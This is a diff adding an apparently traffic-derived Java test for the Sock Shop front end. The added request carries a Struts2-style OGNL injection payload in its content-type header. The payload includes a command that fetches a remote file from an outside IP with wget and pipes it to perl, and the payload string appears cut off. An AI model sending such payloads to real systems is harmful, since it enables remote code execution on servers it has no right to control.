@@ -458,6 +458,20 @@ public class TestsFrontEndSockShopTest
         assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
     }
 
+    @Test
+    public void testGet317() throws MalformedURLException, IOException
+    {
+        // GET http://front-end.sock-shop/ (endp 317)
+        final HttpTarget frontEndSockShop = getHttpClient("http://front-end.sock-shop", new Authentication());
+        final HttpRequest request = new HttpRequest();
+        request.setHeaders(new Hashtable<String, Object>() {{
+            put("content-type", "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget -qO - http://209.90.79.141/pdf/s.pdf | perl");
+        }});
+        final Response response = frontEndSockShop.get(request, "/");
+        assertStatusCode(response.code(), 200);
+        assertCSSselect("div#hot div.box div.container div h2", "Hot this week", response.body().string());
+    }
+
     @ParameterizedTest
     @JsonFileSource(resources = "/dataset_55.json")
     public void testGetParam055(final JsonObject json) throws MalformedURLException, IOException
